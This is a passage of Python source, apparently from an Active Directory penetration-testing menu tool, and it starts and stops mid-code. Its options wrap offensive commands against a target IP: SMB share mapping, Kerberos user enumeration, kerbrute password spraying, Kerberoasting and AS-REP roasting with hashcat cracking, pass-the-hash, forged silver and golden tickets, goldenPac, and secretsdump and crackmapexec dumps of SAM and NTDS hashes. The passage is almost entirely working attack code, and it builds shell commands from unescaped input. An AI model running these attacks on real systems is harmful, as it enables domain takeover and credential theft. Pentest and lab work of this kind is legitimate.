         cutLine("Enter WORKGROUP", "shares2.tmp")
         bonusCheck = linecache.getline("shares2.tmp", 1)
         if "session setup failed: NT_STATUS_PASSWORD_MUS" in bonusCheck:
            print(colored("[!] Bonus!! It looks like we can change this users password...", colour0))
            runCommand("smbpasswd -r " + TIP.rstrip(" ") + " -U " + USR.rstrip(" "))                                    
         if os.path.getsize("shares2.tmp") != 0: 
            catsFile("shares2.tmp")           
            cutLine("is an IPv6 address","shares2.tmp")
            cutLine("no workgroup","shares2.tmp")
            cutLine("NT_STATUS_LOGON_FAILURE","shares2.tmp")
            cutLine("NT_STATUS_ACCESS_DENIED","shares2.tmp")
            cutLine("NT_STATUS_ACCOUNT_DISABLED","shares2.tmp")
            cutLine("NT_STATUS_CONNECTION_RESET","shares2.tmp")
            cutLine("Reconnecting with SMB1","shares2.tmp")
            cutLine("Sharename","shares2.tmp")
            cutLine("---------","shares2.tmp")
            cutLine("^$","shares2.tmp")
            runCommand("sed -i 's/^[ \t]*//' shares2.tmp")
            runCommand("mv shares2.tmp " + dataDir + "/shares.txt")
         with open(dataDir + "/shares.txt", "r") as shares:
            for x in range(0, maxUser):
                SHAR[x] = shares.readline().rstrip(" ")
                SHAR[x] = spacePadding(SHAR[x], COL2)
         with open("shares1.tmp","r") as check:
            if "READ, WRITE" in check.read():
               print(colored("[*] A remote SMB READ/WRITE directory has been identified, checking for possible CVE-2017-7494 exploit - please wait...\n", colour3))
               runCommand("nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 " + TIP.rstrip(" ") + " > exploit.tmp")
               cutLine("Starting Nmap", "exploit.tmp")
               cutLine("Nmap scan report", "exploit.tmp")
               cutLine("Host is up", "exploit.tmp")
               cutLine("Nmap done","exploit.tmp")
               parsFile("exploit.tmp")
               catsFile("exploit.tmp")
      else:
         print("[+] Unable to obtains shares...")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - smbmap -u USER -p PASSWORD -d DOMAIN -H IP -R sharename
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '38':
      checkParams = test_TIP()      
      if checkParams != 1:
         checkParams = test_DOM()                   
      if IP46 == "-6":
         print(colored("[!] WARNING!!! - Not compatable with IP 6...",colour0))		# IT MIGHT BE POSSIBLE TO USE DOMAIN NAME BUT NEED REWRITE!!
         checkParams = 1       
      if checkParams != 1:
         checkParams = test_TSH()             
      if checkParams != 1:
         if NTM[:5] != "EMPTY":
            print("[i] Using HASH value as password credential...")
            print(colored("[*] Checking OS...", colour3))
            runCommand("smbmap -v --admin -u " + USR.rstrip(" ") + "%:'" + NTM.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))      
            print(colored("[*] Checking command privilege...", colour3))
            runCommand("smbmap -x whoami -u " + USR.rstrip(" ") + "%:'" + NTM.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))      
            print(colored("[*] Mapping Shares...", colour3))
            runCommand("smbmap -u " + USR.rstrip(" ") + "%:'" + NTM.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ")  + " -R " + TSH.rstrip(" ") + " --depth 15")      
         else:
            print(colored("[*] Checking OS...", colour3))
            runCommand("smbmap -v --admin -u " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))
            print(colored("[*] Checking command privilege...", colour3))
            runCommand("smbmap -x whoami -u " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))         
            print(colored("[*] Mapping Shares...", colour3))
            runCommand("smbmap -u " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ")  + " -R " + TSH.rstrip(" ") + " --depth 15 > mapped.tmp")            
            cutLine("[+]","mapped.tmp")
            parsFile("mapped.tmp")
            catsFile("mapped.tmp")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - smbmap -u USER -p PASSWORD -d DOMAIN -H IP -R sharename
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '39':
      checkParama = test_TIP()
      if checkParams != 1:
         checkParams = test_DOM()             
      if checkParams != 1:
         exTensions = fileExt.replace(",","|")
         exTensions = "'(" + exTensions + ")'"                           
         if IP46 == "-6":
            print(colored("[!] WARNING!!! - Not compatable with IP 6...", colour0)) 
            checkParams = 1            
      if checkParams != 1:
         checkParams = test_TSH()                  
      if checkParams != 1:
         if NTM[:5] != "EMPTY":
            print("[i] Using HASH value as password credential...")
            print("[+] Downloading any found files...")
            runCommand("smbmap -u " + USR.rstrip(" ") + "%:'" + NTM.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -A " + exTensions + " -R " + TSH.rstrip(" ") + " --depth 15")
         else:
            print("[+] Downloading any found files...")
            runCommand("smbmap -u " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -A " + exTensions + " -R " + TSH.rstrip(" ") + " --depth 15") 
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - smbclient \\\\IP\\SHARE -U USER%PASSWORD.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '40':
      checkParams = test_TIP()           
      if checkParams != 1:
         checkParams = test_TSH()                  
      if checkParams != 1:
         if NTM[:5] != "EMPTY":
            print("[i] Using HASH value as password credential...")
            runCommand("smbclient \\\\\\\\" + TIP.rstrip(" ") + "\\\\" + TSH.rstrip(" ") + " -U " + USR.rstrip(" ") + "%:'" + NTM.rstrip(" ") + "' --pw-nt-hash -s " + TSH.rstrip(" " ))
         else:
            runCommand("smbclient \\\\\\\\" + TIP.rstrip(" ") + "\\\\" + TSH.rstrip(" ") + " -U " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' -s " + TSH.rstrip(" "))
      prompt()
   
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - GetADUsers.py DOMAIN/USER:PASSWORD.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '41':
      checkParams = test_TIP()      
      if checkParams != 1:
         checkParams = test_DOM()               
      if checkParams != 1:
         if NTM[:5] != "EMPTY":
            print("[i] Using HASH value as password credential...")
            runCommand(keyPath + "GetADUsers.py -all " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") +" -dc-ip "  + TIP.rstrip(" "))
         else:
            runCommand(keyPath + "GetADUsers.py -all " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +" -dc-ip "  + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - nmap -p 88 --script=krb-enum-users --script-args krb-enum-users.realm=DOMAIN,userdb=usernames.txt IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '42':
      checkParams = test_TIP()      
      if checkParams != 1:
         checkParams = test_DOM()               
      if checkParams != 1:
         checkParams = test_PRT("88")               
      if checkParams != 1:
         print(colored("[*] Enumerating remote server for valid usernames, please wait...", colour3))
         runCommand("nmap " + IP46 + " -p 88 --script=krb5-enum-users --script-args=krb5-enum-users.realm=\'" + DOM.rstrip(" ") + ", userdb=" + dataDir + "/usernames.txt\' " + TIP.rstrip(" ") + " >> users.tmp")
         runCommand("sed -i '/@/!d' users.tmp")							# PARSE FILE 1
         runCommand("sort -r users.tmp > sortedusers.tmp")                  
         with open("sortedusers.tmp", "r") as read, open("validusers.tmp", "w") as parse:	# PARSE FILE 2
            for username in read:
               username = username.replace("|     ","")
               username = username.replace("|_    ","")
               username, null = username.split("@")
               if username != "":
                  parse.write(username + "\n")                  
         count = lineCount("validusers.tmp")         
         if count > 0:
            print("[+] Found valid usernames...\n")                                         
            with open("validusers.tmp", "r") as read:
               for loop in range(0, count):
                  checkname = read.readline().rstrip("\n")
                  checkname = spacePadding(checkname, COL3)               
                  for x in range(0, maxUser):
                     if checkname == USER[x]:
                        print(colored((USER[x]), colour6))
                        VALD[x] = "1"
                        USER.insert(0, USER.pop(x))
                        HASH.insert(0, HASH.pop(x))
                        VALD.insert(0, VALD.pop(x))
                        break                        
                  for x in range(0, maxUser):
                     if (USER[x][:1] != " ") and (HASH[x][:1] == " "):
                        HASH[x] = "."*COL4                        
            with open(dataDir + "/usernames.txt", "w") as write1, open(dataDir + "/hashes.txt", "w") as write2, open(dataDir + "/tokens.txt", "w") as write3:            
               for x in range(0, maxUser):
                  if USER[x][:1] != " ":
                     write1.write(USER[x].rstrip(" ") + "\n")
                     write2.write(HASH[x].rstrip(" ") + "\n")
                     write3.write(VALD[x].rstrip(" ") + "\n")
         else:
            print("[-] No valid usernames were found...")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - kerbrute.py -domain DOMAIN -users usernames.txt -passwords passwords.txt -outputfile optional.txt.
# Modified: NOTE - THIS DOES NOT CURRENTLY DEAL WITH FOUND MULTIPLE USERS!!!
# -------------------------------------------------------------------------------------

   if selection =='43':
      checkParams = test_TIP()
      found = 0            
      if checkParams != 1:
         checkParams = test_DOM()
      if checkParams != 1:
         print(colored("[*] Trying all usernames with password " + PAS.rstrip(" ") + " first...", colour3))
         runCommand("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users " + dataDir + "/usernames.txt -password '" + PAS.rstrip(" ") + "' -outputfile password1.tmp")
         test1 = linecache.getline("password1.tmp", 1)               
         if test1 != "":
            found = 1
            USR,PAS = test1.split(":")
            USR = spacePadding(USR, COL1)
            PAS = spacePadding(PAS, COL1)
            TGT = privCheck()                         
         if found == 0:
            print(colored("\n[*] Now trying all usernames with matching passwords...",colour3))
            runCommand("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users " + dataDir + "/usernames.txt -passwords " + dataDir + "/usernames.txt -outputfile password2.tmp")
            test2 = linecache.getline("password2.tmp", 1)                        
            if test2 != "":
               found = 1
               USR,PAS = test2.split(":")
               USR = spacePadding(USR, COL1)
               PAS = spacePadding(PAS, COL1)
               TGT = privCheck()                              
         if found == 0:
            print(colored("\n[*] Now trying all users against password list, please wait as this could take sometime...",colour3))            
            runCommand("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users " + dataDir + "/usernames.txt -passwords " + dataDir + "/passwords.txt -outputfile password3.tmp")                 
            test3 = linecache.getline("password3.tmp", 1)                       
            if test3 != "":
               USR,PAS = test3.split(":") 
               USR = spacePadding(USR, COL1)
               PAS = spacePadding(PAS, COL1)
               TGT = privCheck()               
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected -  GetUserSPNs.py DOMAIN/USER:PASSWORD -outputfile hashroast1.txt
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '44':
      checkParams = test_TIP()      
      if checkParams != 1:
         checkParams = test_DOM()                     
      if checkParams != 1:
         if NTM[:5] != "EMPTY":
            print("[i] Using HASH value as password credential...")
            runCommand(keyPath + "GetUserSPNs.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") +" -outputfile hashroast1.tmp")
         else:
            runCommand(keyPath + "GetUserSPNs.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +" -outputfile hashroast1.tmp")                          
         print(colored("[*] Cracking hash values if they exists...\n", colour3))
         runCommand("hashcat -m 13100 --force -a 0 hashroast1.tmp /usr/share/wordlists/rockyou.txt -o cracked1.txt")
         runCommand("strings cracked1.txt")
      else:
         print("[+] The file usernames.txt is empty...")         
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - GetNPUsers.py DOMAIN/ -usersfile usernames.txt -format hashcat -outputfile hashroast2.txt
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='45':
      checkParams = test_TIP()      
      if checkParams != 1:
         checkParams = test_DOM()          
      if checkParams != 1:      
         runCommand("touch authorised.tmp")         
         with open(dataDir + "/usernames.txt", "r") as read:
            for x in range(0, maxUser):
               line = read.readline().rstrip("\n")
               if VALD[x] == "1":
                  runCommand("echo " + line + " >> authorised.tmp")                        
         count = lineCount("authorised.tmp")                       
         if count > 0:           
            with open(dataDir + "/usernames.txt", "r") as read:
               for x in range(0, maxUser):
                  line = read.readline().rstrip("\n")
                  runCommand("echo " + line + " >> authorised.tmp")      
         else:
            print("[+] The authorised user file seems to be empty, so I am authorising everyone in the list..")                     
         if checkParams != 1:
            if NTM[:5] != "EMPTY":
               print("[i] Using HASH value as password credential...")
               runCommand(keyPath + "GetNPUsers.py -outputfile hashroast2.tmp -format hashcat " + DOM.rstrip(" ") + "/ -usersfile authorised.tmp")
            else:
               runCommand(keyPath + "GetNPUsers.py -outputfile hashroast2.tmp -format hashcat " + DOM.rstrip(" ") + "/ -usersfile authorised.tmp")                        
            print(colored("[*] Cracking hash values if they exists...\n", colour3))
            runCommand("hashcat -m 18200 --force -a 0 hashroast2.tmp /usr/share/wordlists/rockyou.txt -o cracked2.txt")
            runCommand("strings cracked2.txt")         
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '46':
      checkParams = test_PAS()
      if checkParams != 1:    
         NTM = hashlib.new("md4", PAS.rstrip(" ").encode("utf-16le")).digest()
         NTM = binascii.hexlify(NTM)
         NTM = str(NTM)
         NTM = NTM.lstrip("b'")
         NTM = NTM.rstrip("'")                
         for x in range(0, maxUser):
            if USER[x].rstrip(" ") == USR.rstrip(" "):
               HASH[x] = NTM.rstrip(" ")
         print("[+] Created hash value " + NTM + "...")
         NTM = spacePadding(NTM, COL1)
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - getTGT.py DOMAIN/USER:PASSWORD
# Details :                        getTGT.py DOMAIN/USER -hashes :HASH
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '47':
      checkParams = test_TIP()      
      if checkParams != 1:
         checkParams = test_DOM()                             
      if USR[:2] == "''":
         print("[-] Please enter a valid username for enumeration...")
         checkParams = 1              
      if checkParams != 1:       
         count = lineCount(dataDir + "/hashes.txt")         
         counter = 0                  
         if count > 12:
            marker = int(round(count/4))
         else:
            marker = 0
         marker1 = marker
         marker2 = marker * 2
         marker3 = marker * 3                                       
         if count > 0:
            print("[+] Please wait, bruteforcing remote server using " + str(count) + " hashes...")                        
            with open(dataDir + "/hashes.txt", "r") as force:
               for brute in force:
                  brute = brute.rstrip("\n")                               
                  runCommand(keyPath + "getTGT.py " + DOM.rstrip(" ") +  "/" + USR.rstrip(" ") + " -hashes :" + brute + " -dc-ip " + TIP.rstrip(" ") + " > datalog.tmp")
                  counter = counter + 1
                  runCommand("sed -i '1d' datalog.tmp")
                  runCommand("sed -i '1d' datalog.tmp")                                 
                  with open("datalog.tmp", "r") as ticket:
                     checkFile = ticket.read()                                           
                  if "[*] Saving ticket" in checkFile:
                     print("[+] Ticket successfully generated for " + USR.rstrip(" ") + " using hash substitute " + str(USER[counter]).rstrip(" ") + ":" + brute + "...")                    
                     TGT = privCheck()                         
                     NTM = spacePadding(brute, COL1)
                     checkParams = 2
                     break                                                               
                  if "Clock skew too great" in checkFile:
                     print("[-] Clock skew too great, terminating...")
                     checkParams = 2
                     break                                                               
                  if marker1 == counter:
                     print("[i] 25% completed...")                                          
                  if marker2 == counter:
                     print("[i] 50% completed...")                                          
                  if marker3 == counter:
                     print("[i] 75% completed...")                                              
            if checkParams != 2:
               print("[-] 100% complete - exhausted!!...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Overpass the HASH/pass the key 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '48':
      checkParams = test_TIP()      
      if checkParams != 1:
         checkParams = test_DOM()               
      if checkParams != 1:
         print(colored("[*] Trying to create TGT for user " + USR.rstrip(" ") + "...", colour3))                  
         if (NTM[:1] != ""):
            print("[i] Using HASH value as password credential...")
            runCommand(keyPath + "getTGT.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes :" + NTM.rstrip(" "))                        
            if os.path.exists(USR.rstrip(" ") + ".ccache"):
               print("[+] Checking TGT status...")
               TGT = privCheck()
         else:
            print("[+] TGT was not generated...")                              
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - kinit j.nakazawa@REALCORP.HTB.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='49':
      checkParams = test_TIP()
      if checkParams != 1:
         checkParams = test_DOM()
      if checkParams != 1:
         checkParams = test_USR()
      if checkParams != 1:
         krb5 = input("[?] Please enter default realm :")
         print(colored("[*] Attempting to create kerberus ticket for user " + USR.rstrip(" ") + "@" + krb5.rstrip("\n") + "...", colour3))
         runCommand("mv /etc/krb5.conf /etc/krb5.conf.bak")
         runCommand("echo '[libdefaults]' > /etc/krb5.conf")
         runCommand("echo '	default_realm = " + krb5.rstrip("\n") + "' >> /etc/krb5.conf")
         runCommand("echo '[realms]' >> /etc/krb5.conf")
         runCommand("echo '\t\t" + krb5.rstrip("\n") + " = {' >> /etc/krb5.conf")
         runCommand("echo '\t\t\tkdc = " + TIP.rstrip(" ") + "' >> /etc/krb5.conf")
         runCommand("echo '\t\t\t}' >> /etc/krb5.conf\n")
         runCommand("kinit " + USR.rstrip(" "))
         runCommand("klist")
         runCommand("rm /etc/krb5.conf")
         runCommand("mv /etc/krb5.conf.bak /etc/krb5.conf")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - ticketer.py -nthash HASH -domain-sid DOMAIN-SID -domain DOMAIN -spn cifs/COVID-3
# Details : Silver Ticket!! 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '50':
      checkParams = test_TIP()     
      if checkParams != 1:
         checkParams = test_DOM()         
      if checkParams != 1:
         checkParams = test_USR()         
      if checkParams != 1:
         print(colored("[*] Trying to create silver TGT for user " + USR.rstrip(" ") + "...", colour3))                  
         if (NTM[:1] != "") & (SID[:1] != ""):
            print("[i] Using HASH value as password credential...")
            runCommand(keyPath + "ticketer.py -nthash :" + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " -spn CIFS/DESKTOP-01." + DOM.rstrip(" ") + " " + USR.rstrip(" "))            
         if os.path.exists(USR.rstrip(" ") + ".ccache"):
            print("[+] Checking silver TGT status...")
            TGT = privCheck()
         else:
             print("[+] Silver TGT was not generated...")                   
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - GOLDEN TICKET ticketer.py -nthash HASH -domain-sid DOMAIN SID -domain DOMAIN USER
# Details : Golden Ticket!!
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '51':
      checkParams = test_TIP()      
      if checkParams != 1:
         checkParams = test_DOM()         
      if checkParams != 1:
         checkParams = test_USR()         
      if checkParams != 1:
         print(colored("[*] Trying to create golden TGT for user " + USR.rstrip(" ") + "...", colour3))         
         
         if (NTM[:1] != "") & (SID[:1] != ""):
            print("[i] Using HASH value as password credential...")
            runCommand(keyPath + "ticketer.py -nthash :" + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " " + USR.rstrip(" "))                        
         if os.path.exists(USR.rstrip(" ") + ".ccache"):
            print("[+] Checking gold TGT status...")
            TGT = privCheck()
         else:
            print("[+] Golden TGT was not generated...")            
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - ldapdomaindump
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='52':
      checkParams = test_TIP()      
      if checkParams != 1:
         checkParams = test_DOM()               
      if checkParams != 1:
         if NTM[:5] != "EMPTY":
            print("[i] Using HASH value as password credential...")
            runCommand("ldapdomaindump -u '" + DOM.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p :" + NTM.rstrip(" ") +" " + TIP.rstrip(" ") + " -o " + workDir)
         else:
            runCommand("ldapdomaindump -u '" + DOM.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p '" + PAS.rstrip(" ") +"' " + TIP.rstrip(" ") + " -o " + workDir)                     
         print(colored("[*] Checking downloaded files...\n", colour3))
         runCommand("ls -la ./" + workDir + "/*.*")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - goldenpac.py -dc-ip IP -target-ip IP DOMAIN/USER:PASSWORD@DOMAIN
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='53':
      checkParams = test_TIP()      
      if checkParams != 1:
         checkParams = test_DOM()               
      if checkParams != 1:
         if NTM[:5] != "EMPTY":
            print("[i] Using HASH value as password credential...")
            runCommand(keyPath + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -hashes :" + NTM.rstrip(" "))
         else:
            runCommand(keyPath + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + DOM.rstrip(" "))
      prompt()      
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Bloodhound-python -d DOMAIN -u USER -p PASSWORD
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='54':
      checkParams = test_TIP()      
      if checkParams != 1:
         checkParams = test_DOM()                     
      if checkParams != 1:
         print ("[*] Enumerating, please wait...\n")                       
         if PAS[:2] != "''":
            runCommand("bloodhound-python -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -c all -ns " + TIP.rstrip(" "))
         else:
            if NTM[:5].upper() != "EMPTY":
               print("[i] Using HASH value as password credential...")
               runCommand("bloodhound-python -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " --hashes " + NTM.rstrip(" ") + " -c all -ns " + TIP.rstrip(" "))            
            else:
               print("[-] Both, password and ntlm hash values are invalid...")
      print("\n[*] Checking downloaded files...\n")
      runCommand("mv *.json ./" + workDir)
      runCommand("ls -la ./" + workDir + "/*.*")            
      prompt()
         
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - aclpwn - du neo4j password -f USER - d DOMAIN -sp PASSWORD -s IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='55':
      checkParams != test_TIP()      
      if checkParams != 1:
         checkParams = test_DOM()               
      if checkParams != 1:
         BH1 = input("[+] Enter Neo4j username: ")
         BH2 = input("[+] Enter Neo4j password: ")                  
         if BH1 != "" and BH2 != "":
            runCommand("aclpwn -du " + BH1 + " -dp " + BH2 + " -f " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -sp " + PAS.rstrip(" ") + " -s " + TIP.rstrip(" "))
         else:
            print("[+] Username or password cannot be null...")            
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - secretdump.py DOMAIN/USER:PASSWORD@IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='56':
      checkParams = test_TIP()      
      if checkParams != 1:
         checkParams = test_DOM()               
      if checkParams != 1:
         print(colored("[*] Enumerating, please wait...", colour3))         
         if PAS[:2] != "''":
            runCommand(keyPath + "secretsdump.py '" + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + "' > secrets.tmp")
         else:
            print("[i] Using HASH value as password credential...")
            runCommand(keyPath + "secretsdump.py '" + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + "' -hashes ':" + NTM.rstrip(" ") + "' > secrets.tmp")                        
         runCommand("sed -i '/:::/!d' secrets.tmp")
         runCommand("sort -u secrets.tmp > ssecrets.tmp")         
         count = lineCount("ssecrets.tmp")               	
         if count > 0:               
            runCommand("rm " + dataDir + "/usernames.txt")
            runCommand("rm " + dataDir + "/hashes.txt")
            wipeTokens(VALD)             
            for x in range(0, count):
               data = linecache.getline("ssecrets.tmp", x + 1)               
               data = data.replace(":::","")               
               try:
                  get1,get2,get3,get4 = data.split(":") 
               except ValueError:
                  try:
                     print(colored("[!] WARNING!!! - Huston, we encountered a problem while unpacking a hash value, but fixed it in situ... just letting you know!!...", colour0))
                     get1, get2, get3 = data.split(":")
                     get4 = get3
                  except:
                     get1 = "Major Error..."
                     get2 = "Major Error..."
                     get3 = "Major Error..."
                     get4 = "Major Error..."                     
               get1 = get1.rstrip("\n")
               get2 = get1.rstrip("\n")
               get3 = get1.rstrip("\n")
               get4 = get4.rstrip("\n")                              
               print(colored("[+] Found User " + get1,colour6))            
               USER[x] = get1[:COL3]
               HASH[x] = get4[:COL4]
               USER[x] = spacePadding(USER[x], COL3)
               HASH[x] = spacePadding(HASH[x], COL4)               
               if USER[x][:1] != " ":
                  runCommand("echo " + USER[x].rstrip(" ") + " >> " + dataDir + "/usernames.txt")
                  runCommand("echo " + HASH[x].rstrip(" ") + " >> " + dataDir + "/hashes.txt")           
         else:      
            print("[+] No users were found. check the domain name is correct...")               
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - crackmapexec smb IP -u Administrator -p password --lusers --local-auth --shares & H hash -x 'net user Administrator /domain'
# Modified: crackmapexec currently (03/01/2021) has a python3 problem - so this is a work around that still does not terminate properly.
# -------------------------------------------------------------------------------------

   if selection =='57':
      checkParams = test_TIP()      
      if checkParams != 1:
         checkParams = test_DOM()               
      if checkParams != 1:      
         if PAS[:2] != "''":
            checkParams = test_PRT("5985")                                    
            if checkParams != 1:
               print("[+] Finding exploitable machines on the same subnet...\n")
               runCommand("crackmapexec winrm " + TIP.rstrip(" ") + "/24")                         
            checkParams = test_PRT("445")
            if checkParams != 1:
               print("\n[+] Checking priviliges...\n")
               runCommand("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -X whoami")
               print("\n[+] Enumerating users...\n")
               runCommand("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --users")               
               print("\n[+] Enumerating shares...\n")
               runCommand("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --shares")               
               print("\n[+] Enumerating sessions...\n")
               runCommand("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --sessions")               
               print("\n[+] Enumerating SAM...\n")
               runCommand("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --local-auth --sam")               
               print("\n[+] Enumerating NTDS...\n")
               runCommand("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --local-auth --ntds drsuapi")
         else:
            print("[i] Using HASH value as password credential...")
            checkParams = test_PRT("5985")
            if checkParams != 1:
               print("[+] Finding exploitable machines on the same subnet...\n")
               runCommand("crackmapexec winrm " + TIP.rstrip(" ") + "/24")                    
            checkParams = test_PRT("445")
            if checkParams != 1:
